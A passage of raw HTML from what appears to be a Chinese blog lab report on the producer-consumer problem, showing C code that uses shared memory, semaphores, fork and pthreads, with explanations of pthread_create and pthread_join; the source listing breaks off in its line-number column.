class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> digit;<br>digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br><span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//得到A～Z的一个随机字母</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> letter;<br>letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br><span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-comment">//sem_id 表示信号量集合的 id</span><br><span class="hljs-comment">//sem_num 表示要处理的信号量在信号量集合中的索引</span><br><span class="hljs-comment">//P操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">-1</span>; <span class="hljs-comment">//表示要把信号量减一</span><br>sb.sem_flg = <span class="hljs-number">0</span>; <span class="hljs-comment">//</span><br><span class="hljs-comment">//第二个参数是 sembuf [] 类型的，表示数组</span><br><span class="hljs-comment">//第三个参数表示 第二个参数代表的数组的大小</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;waitSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//V操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">signalSem</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sem_id, <span class="hljs-keyword">int</span> sem_num)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br>sb.sem_num = sem_num;<br>sb.sem_op = <span class="hljs-number">1</span>;<br>sb.sem_flg = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//第二个参数是 sembuf [] 类型的，表示数组</span><br><span class="hljs-comment">//第三个参数表示 第二个参数代表的数组的大小</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semop</span>(sem_id, &amp;sb, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;signalSem failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//打印进程运行时间</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//打印时间</span><br><span class="hljs-keyword">time_t</span> now;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//实例化tm结构指针</span><br><span class="hljs-built_in">time</span>(&amp;now);<br>timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-comment">//生产者进程的生产和信息打印</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random()); //随机睡眠一段时间，相当于人为扩大进程执行操作时间</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br><span class="hljs-comment">//生产产品</span><br><span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//随机获取字母</span><br>shmptr-&gt;str[shmptr-&gt;in] = c;<br>shmptr-&gt;in = (shmptr-&gt;in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//写入新产品</span><br>shmptr-&gt;num++;<br><span class="hljs-comment">//打印缓冲区</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//控制输出格式</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//进程id信息</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-comment">//消费者进程的消费和信息打印</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, struct my_buffer *shmptr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//sleep(get_random());</span><br><span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br><span class="hljs-comment">/*生产产品*/</span><br><span class="hljs-keyword">char</span> lt = shmptr-&gt;str[shmptr-&gt;out];<br>shmptr-&gt;out = (shmptr-&gt;out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>shmptr-&gt;is_empty = (shmptr-&gt;out == shmptr-&gt;in); <span class="hljs-comment">//</span><br>shmptr-&gt;num--;<br><span class="hljs-comment">//打印缓冲区</span><br><span class="hljs-keyword">int</span> p = (shmptr-&gt;in - <span class="hljs-number">1</span> &gt;= shmptr-&gt;out) ? (shmptr-&gt;in - <span class="hljs-number">1</span>) : (shmptr-&gt;in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br><span class="hljs-keyword">for</span> (p; !(shmptr-&gt;is_empty) &amp;&amp; p &gt;= shmptr-&gt;out; p--)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, shmptr-&gt;str[p % MAX_BUFFER_SIZE]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - shmptr-&gt;num; j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);  <span class="hljs-comment">//控制输出格式</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, i + <span class="hljs-number">1</span>); <span class="hljs-comment">//进程id信息</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, lt); <span class="hljs-comment">//进程操作</span><br><span class="hljs-built_in">fflush</span>(stdout);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">srand</span>((<span class="hljs-keyword">unsigned</span>)(<span class="hljs-built_in">getpid</span>() + <span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)));<br>shm_id = <span class="hljs-built_in">shmget</span>(IPC_PRIVATE, MAX_BUFFER_SIZE, SHM_MODE); <span class="hljs-comment">//申请共享内存</span><br><span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create shared memory failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span> *<span class="hljs-title">shmptr</span>;</span><br>shmptr = <span class="hljs-built_in">shmat</span>(shm_id, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//将申请的共享内存附加到申请通信的进程空间</span><br><span class="hljs-keyword">if</span> (shmptr == (<span class="hljs-keyword">void</span> *)<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;add buffer to using process space failed！\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((sem_id = <span class="hljs-built_in">semget</span>(IPC_PRIVATE, <span class="hljs-number">3</span>, SEM_MODE)) &lt; <span class="hljs-number">0</span>)<br>&#123; <span class="hljs-comment">//创建三个信号量，SEM_EMPTY,SEM_FULL和MUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;create semaphore failed! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_FULL, SETVAL, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为0的信号量设置为0--&gt;SEM_FULL</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, SEM_EMPTY, SETVAL, <span class="hljs-number">10</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为1的信号量设置为10--&gt;SEM_EMPTY</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">semctl</span>(sem_id, MUTEX, SETVAL, <span class="hljs-number">1</span>) == <span class="hljs-number">-1</span>)<br>&#123; <span class="hljs-comment">//将索引为3的信号量设置为1--&gt;MUTEX</span><br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;sem set value error! \n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">//初始化缓冲区</span><br>shmptr-&gt;out = <span class="hljs-number">0</span>;<br>shmptr-&gt;in = <span class="hljs-number">0</span>;<br>shmptr-&gt;is_empty = <span class="hljs-number">1</span>;<br>shmptr-&gt;num = <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Process Execution Table-----------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  |current  process| operation |\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_PRODUCER; i++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>producer_id = fork();<br><br><span class="hljs-keyword">if</span> (producer_id &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (producer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//是子进程则执行生产操作</span><br>&#123;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_EMPTY);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">produce_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_FULL);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N_CONSUMER; i++)<span class="hljs-comment">//</span><br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br>consumer_id = fork();<br><br><span class="hljs-keyword">if</span> (consumer_id &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//调用fork失败</span><br>&#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;the fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (consumer_id == <span class="hljs-number">0</span>) <span class="hljs-comment">//是子进程则执行消费操作</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N_WORKTIME; j++)<br>&#123;<br><span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br><span class="hljs-built_in">waitSem</span>(sem_id, SEM_FULL);<br><span class="hljs-built_in">waitSem</span>(sem_id, MUTEX);<br><br><span class="hljs-built_in">consume_print</span>(i, shmptr);<br><br><span class="hljs-built_in">signalSem</span>(sem_id, MUTEX);<br><span class="hljs-built_in">signalSem</span>(sem_id, SEM_EMPTY);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//主进程最后退出</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">wait</span>(<span class="hljs-number">0</span>) != <span class="hljs-number">-1</span>)<br>;<br><span class="hljs-comment">//将共享段与进程之间解除连接</span><br><span class="hljs-built_in">shmdt</span>(shmptr);<br><span class="hljs-comment">//对共享内存区执行控制操作</span><br><span class="hljs-built_in">shmctl</span>(shm_id, IPC_RMID, <span class="hljs-number">0</span>); <span class="hljs-comment">//当cmd为IPC_RMID时，删除该共享段</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;主进程运行结束！\n&quot;</span>);<br><br><span class="hljs-built_in">fflush</span>(stdout);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果"><a class="markdownIt-Anchor" href="#程序初值和运行结果"></a> 程序初值和运行结果</h4><p>进程</p><p><img src="/posts/3994810f/image-20211130090602101.png" alt="image-20211130090602101"></p><p><img src="/posts/3994810f/image-20211130090745719.png" alt="image-20211130090745719"></p><h3 id="线程实现"><a class="markdownIt-Anchor" href="#线程实现"></a> 线程实现</h3><h4 id="预备知识-2"><a class="markdownIt-Anchor" href="#预备知识-2"></a> 预备知识</h4><h5 id="pthread_create"><a class="markdownIt-Anchor" href="#pthread_create"></a> pthread_create</h5><p>pthread_create是UNIX环境创建线程函数</p><p><strong>头文件：</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></div></td></tr></table></figure><p><strong>函数声明：</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_create</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> *<span class="hljs-keyword">restrict</span> tidp,<span class="hljs-keyword">const</span> <span class="hljs-keyword">pthread_attr_t</span> *restrict_attr,<span class="hljs-keyword">void</span>*（*start_rtn)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span>,<span class="hljs-keyword">void</span> *<span class="hljs-keyword">restrict</span> arg)</span>;<br>参数：<br></code></pre></div></td></tr></table></figure><ul><li>第一个参数为指向线程标识符的指针，可用如下方式定义 pthread_t thread1;</li><li>第二个参数用来设置线程属性。</li><li>第三个参数是线程运行函数的地址，即函数名，函数内包括循环。</li><li>最后一个参数是运行函数的参数。</li></ul><p><strong>返回值：</strong></p><p>若成功则返回0，否则返回出错编号</p><p><strong>注意：</strong></p><p>在编译时注意加上-l pthread参数，以调用静态链接库。因为pthread并非Linux系统的默认库。</p><h5 id="pthread_join"><a class="markdownIt-Anchor" href="#pthread_join"></a> <strong>pthread_join</strong></h5><p><strong>函数简介：</strong></p><p>函数pthread_join用来等待一个线程的结束。pthread_join()函数，以阻塞的方式等待thread指定的线程结束。当函数返回时，被等待线程的资源被收回。如果线程已经结束，那么该函数会立即返回。并且thread指定的线程必须是joinable的。<br>　　<br><strong>头文件：</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br></code></pre></div></td></tr></table></figure><p><strong>函数声明：</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pthread_join</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> thread, <span class="hljs-keyword">void</span> **retval)</span></span>;<br></code></pre></div></td></tr></table></figure><p><strong>参数：</strong></p><ul><li><p>thread: 线程标识符，即线程ID，标识唯一线程，为被等待的线程标识符。</p></li><li><p>retval: 用户定义的指针，用来存储被等待线程的返回值。</p></li></ul><p><strong>返回值：</strong></p><p>如果执行成功，将返回0，如果失败则返回一个错误号。</p><h4 id="数据结构和符号说明-2"><a class="markdownIt-Anchor" href="#数据结构和符号说明-2"></a> <strong>数据结构</strong>和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//三个信号量</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//线程间互斥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//填充的个数</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//空槽的个数</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//缓冲区结构体</span><br><span class="hljs-comment">//struct my_buffer *buffer</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span><span class="hljs-comment">//得到3以内的一个随机数</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span><span class="hljs-comment">//得到A～Z的一个随机字母</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印时间</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//生产者进程的生产和信息打印</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//消费者进程的生消费和信息打印</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//生产者线程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//若空槽个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span><span class="hljs-comment">//消费者线程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//若填充个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="源代码-2"><a class="markdownIt-Anchor" href="#源代码-2"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span 